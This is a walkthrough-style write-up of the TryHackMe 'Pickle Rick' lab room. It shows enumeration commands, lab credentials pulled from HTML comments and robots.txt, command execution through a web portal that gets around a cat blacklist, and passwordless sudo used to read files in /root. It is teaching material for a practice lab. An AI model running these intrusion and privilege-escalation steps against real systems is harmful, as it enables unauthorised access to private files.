# TryHackMe — Pickle Rick (room) — Walkthrough-style Writeup
**Target (lab IP):** `<ROOM_IP>`  
**Author:** dinnie  
**Date:** $(date -u +"%Y-%m-%d %H:%M:%SZ")  
**Reference:** adapted from the walkthrough (lab).

---

## TL;DR
You enumerate the web host (HTTP), find a hint (username) in HTML comments and a password in `robots.txt`, discover a `portal.php` login, authenticate with the discovered credentials, use the portal's command box to list files and read files (using `less` since `cat` is restricted), find first secret ingredient, then use `sudo -l` (passwordless sudo) to enumerate higher-privilege files and read the remaining two ingredients.

**TryHackMe Answer placeholders (filled):**
1. First ingredient: **${ING1}**  
2. Second ingredient: **${ING2}**  
3. Last ingredient: **${ING3}**

> Note: These answers are included here per your request. If you plan to publish this repository publicly, consider removing or redacting direct answers to challenge rooms.

---

## Environment & artifacts
- Kali VM (connected to TryHackMe VPN)
- Working folder: `$WORKDIR`
- Artifacts (local): `$WORKDIR/artifacts/<ROOM_IP>/`
- Tools used: `nmap`, `curl`, `wget`, `gobuster`, browser DevTools, `less`, `grep`.

**Safety note:** do not push VPN configs, private keys, or tokens to public repos.

---

## Step-by-step walkthrough (commands & notes)

### 0) Prep / set variables
```bash
TARGET=<room-ip>
ART="\$HOME/lab/tryhackme/artifacts/\$TARGET"
mkdir -p "\$ART" "\$ART/web"
Discovery

bash
Copy code
ping -c 3 $TARGET | tee "$ART/ping.txt"
nmap -Pn -sS -sV -T4 -oN "$ART/nmap_quick.txt" $TARGET
# Expect: port 80 (http) open (and often port 22 ssh)
Visit homepage & view source
Open http://$TARGET/ in the browser and view page source. Look for HTML comments; you will find a hinted username:

html
Copy code
<!-- Note to self, remember username!
     Username: R1ckRul3s
-->
Check robots & mirror site

bash
Copy code
curl -s "http://$TARGET/robots.txt" | tee "$ART/robots.txt"
wget --mirror --convert-links --adjust-extension --page-requisites --no-parent "http://$TARGET/" -P "$ART/web/wget_mirror"
In the walkthrough the robots file included Wubbalubbadubdub (treat it as lab-only credential).

Look for portal/login pages

bash
Copy code
# quick custom guesslist (or run gobuster)
for p in portal.php portal login admin; do
  curl -s -I "http://$TARGET/$p" | sed -n '1,20p'
done
# open http://$TARGET/portal.php in browser
Login to portal
Username: R1ckRul3s

Password: (found in robots / assets in-lab)
Login yields a command execution box.

Use the portal command box: enumerate and read files
ls -> shows Sup3rS3cretPickl3Ingred.txt

less Sup3rS3cretPickl3Ingred.txt -> reveals the first ingredient (${ING1})

(cat may be blacklisted; use less or tail as allowed)

Inspect code & blacklist
Use the command box to search the webapp files and reveal the list of blacklisted commands (the site source printed the blacklist during the walkthrough).

Check sudo privileges
Run sudo -l from the command box (or shell) — the walkthrough found passwordless sudo allowed for the web user.

Enumerate root/home and read other flags

bash
Copy code
sudo ls ../../../*   # or sudo ls /root /home/rick
sudo less /root/3rd.txt
less /home/rick/"second ingredients"
These reveal the remaining two ingredients: ${ING2} and ${ING3}.
